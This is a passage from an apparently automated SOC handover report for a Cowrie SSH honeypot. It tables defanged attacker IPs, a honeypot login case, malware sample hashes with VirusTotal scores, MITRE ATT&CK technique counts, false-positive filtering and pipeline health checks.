- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de31f7eae5cd

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-07 09:21 |
| **Last Seen** | 2026-05-07 09:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 09:21:36` | `cowrie.session.connect` |
| `2026-05-07 09:21:36` | `cowrie.client.version` |
| `2026-05-07 09:21:36` | `cowrie.client.kex` |
| `2026-05-07 09:21:36` | `cowrie.login.success` |
| `2026-05-07 09:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `185.238.70[.]83` | **42** | 2026-05-07 06:52 | 2026-05-07 07:03 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `104.155.17[.]118` | **32** | 2026-05-07 08:05 | 2026-05-07 08:06 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.62.60[.]145` | **32** | 2026-05-07 07:09 | 2026-05-07 07:09 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.240.107[.]137` | **32** | 2026-05-07 09:18 | 2026-05-07 09:19 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.0.13[.]61` | **30** | 2026-05-07 07:43 | 2026-05-07 09:29 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.177.101[.]45` | **30** | 2026-05-07 08:27 | 2026-05-07 08:56 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.41[.]71` | **24** | 2026-05-07 07:12 | 2026-05-07 07:17 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `82.85.192[.]60` | **11** | 2026-05-07 09:07 | 2026-05-07 09:10 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `165.73.87[.]104` | **8** | 2026-05-07 07:41 | 2026-05-07 07:44 | 4m | 0 | `T1592` | 🟢 LOW |
| `175.107.228[.]160` | **6** | 2026-05-07 08:08 | 2026-05-07 08:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `109.136.121[.]178` | 1 | 2026-05-07 09:52 | 2026-05-07 09:52 | 3s | 0 | `T1592` | 🟢 LOW |
| `112.86.12[.]39` | 1 | 2026-05-07 07:22 | 2026-05-07 07:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.109[.]71` | 1 | 2026-05-07 07:43 | 2026-05-07 07:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `149.106.228[.]11` | 1 | 2026-05-07 09:45 | 2026-05-07 09:45 | 12s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-05-07 09:55 | 2026-05-07 09:56 | 40s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]60` | 1 | 2026-05-07 09:05 | 2026-05-07 09:06 | 15s | 0 | `T1592` | 🟢 LOW |
| `8.219.10[.]57` | 1 | 2026-05-07 07:39 | 2026-05-07 07:39 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `82.85.192[.]60` | IT | Active Network srl | **100** ⚠️ | 1 |
| `104.155.17[.]118` | BE | Google LLC | **100** ⚠️ | 0 |
| `165.73.87[.]104` | ZA | AFRIHOST SP (PTY) LTD | **100** ⚠️ | 0 |
| `223.123.41[.]71` | PK | CMPak Limited | **100** ⚠️ | 9 |
| `185.238.70[.]83` | SA | Al wafai International For Communication and Information Technology LLC | **100** ⚠️ | 2 |
| `66.132.195[.]60` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `35.240.107[.]137` | BE | Google LLC | **100** ⚠️ | 1 |
| `34.62.60[.]145` | BE | Google LLC | **100** ⚠️ | 0 |
| `149.106.228[.]11` | IL | Bezeq- THE ISRAEL TELECOMMUNICATION CORP. LTD. | **100** ⚠️ | 2 |
| `34.0.13[.]61` | IN | Google LLC | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 84 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 75 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (41 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 14 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 309 cases |
| Tool 34  | Credential Extractor        | ✅ 92 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 41 filtered (13.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 17 recon entry/entries in table (10 group(s) consolidating 247 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-07T10:28:54Z_
